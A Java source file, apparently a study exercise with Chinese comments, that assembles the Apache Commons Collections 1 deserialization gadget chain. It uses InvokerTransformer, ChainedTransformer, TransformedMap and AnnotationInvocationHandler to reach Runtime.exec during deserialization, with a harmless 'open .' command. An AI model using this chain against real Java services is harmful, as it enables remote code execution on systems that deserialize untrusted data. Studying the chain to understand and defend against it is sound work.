package commenCollections1;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;

import java.io.*;
import java.lang.annotation.Target;
import java.lang.reflect.Constructor;
import java.util.HashMap;
import java.util.Map;

public class CC1_Test {

    public static void main(String[] args) throws Exception {
//        Runtime.getRuntime().exec("open .");

//        但是runtime没有继承序列化，不能进行序列化反序列化操作
//        Runtime r = Runtime.getRuntime();

//        与之前类似的反射调用
//        Class c = Runtime.class;
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "open /System/Applications/Calculator.app/Contents/MacOS/Calculator");

//        String command = "open /System/Applications/Calculator.app/Contents/MacOS/Calculator";

//        使用transformer的反射
//        InvokerTransformer invokerTransformer = new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open ."});
//        invokerTransformer.transform(r);

//        利用反射获取可序列化的Runtime.getRuntime
//        Method getRuntimeMethod = (Method) new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}).transform(Runtime.class);
//        Runtime r = (Runtime) new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}).transform(getRuntimeMethod);
//        new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open /System/Applications/Calculator.app/Contents/MacOS/Calculator"}).transform(r);

//        用ChainedTransformer改写上面的三个冗余的反射
        Transformer[] transformers = new Transformer[]{
                new ConstantTransformer(Runtime.class),
                new InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open ."})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
//        chainedTransformer.transform(Runtime.class);

//        Class c = Runtime.class;
//        Method getRuntimeMethod = c.getMethod("getRuntime", null);
//        Runtime r = (Runtime) getRuntimeMethod.invoke(null, null);
//        Method execMethod = c.getMethod("exec", String.class);
//        execMethod.invoke(r, "open /System/Applications/Calculator.app/Contents/MacOS/Calculator");


        HashMap<Object, Object> map = new HashMap<>();
        map.put("value", "value");
        Map<Object, Object> transformedMap = TransformedMap.decorate(map, null, chainedTransformer);

//        for (Map.Entry entry: transformedMap.entrySet()) {
//            entry.setValue(r);
//        }

//        利用反射获取
        Class c = Class.forName("sun.reflect.annotation.AnnotationInvocationHandler");
        Constructor annotationInvocationHDLConstructor = c.getDeclaredConstructor(Class.class, Map.class);
        annotationInvocationHDLConstructor.setAccessible(true);
        Object o = annotationInvocationHDLConstructor.newInstance(Target.class, transformedMap);
        serialize(o);
        deserialize("ser.bin");
    }

    public static void serialize(Object obj) throws IOException {
        ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream("ser.bin"));
        oos.writeObject(obj);
    }

    public static Object deserialize(String fileName) throws IOException, ClassNotFoundException {
        ObjectInputStream ois = new ObjectInputStream(new FileInputStream(fileName));
        Object obj = ois.readObject();
        return obj;
    }
}
